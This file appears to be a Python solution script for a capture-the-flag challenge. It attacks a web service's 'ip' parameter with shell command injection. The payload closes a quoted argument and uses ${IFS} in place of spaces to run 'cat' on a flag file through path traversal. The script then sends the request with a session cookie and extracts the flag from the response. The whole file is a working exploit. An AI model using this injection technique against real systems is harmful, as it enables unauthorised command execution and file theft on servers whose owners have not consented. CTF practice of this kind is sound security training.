import os
import re
import urllib.parse

import requests
from dotenv import load_dotenv

load_dotenv()

from yachalk import chalk

PAYLOAD = {
    "ip": "www.google.com';${IFS}cat${IFS}../../../../flag.txt;\\",
    "debug": "True",
}
PAYLOAD_ENCODED = urllib.parse.urlencode(PAYLOAD)
PAYLOAD_DOUBLE_ENCODED = urllib.parse.unquote(PAYLOAD_ENCODED)

DOMAIN = os.environ.get("DOMAIN")
TARGET = f"http://{DOMAIN}:1244/?{PAYLOAD_DOUBLE_ENCODED}"

FLAG_REGEX = "flag{.*"

session = requests.Session()


def setup():
    session.cookies.set(
        name=os.environ.get("COOKIE_NAME"), value=os.environ.get("COOKIE_VALUE"), domain=DOMAIN,
    )

    print(chalk.bold("Cookies \t"), chalk.black(session.cookies.get_dict()))
    print(chalk.bold("Payload \t"), chalk.yellow(PAYLOAD))
    print(chalk.bold("Encoded \t"), chalk.yellow(PAYLOAD_ENCODED))
    print(chalk.bold("Encoded (x2)\t"), chalk.yellow(PAYLOAD_DOUBLE_ENCODED))
    print(chalk.bold("Target  \t"), chalk.red_bright(TARGET), "\n")


def attack():
    r = session.get(TARGET)
    flag = re.search(FLAG_REGEX, r.text).group(0)

    print(
        chalk.black(
            f"========================================================================================",
            chalk.white.bold("\nResponse:"),
            "\n========================================================================================",
        )
    )
    print(chalk.black(r.text))
    print(
        chalk.black(
            "========================================================================================"
        )
    )
    print(chalk.white.bold("Flag:\t"), chalk.green_bright(flag))
    print(
        chalk.black(
            "========================================================================================"
        )
    )


if __name__ == "__main__":
    setup()
    attack()
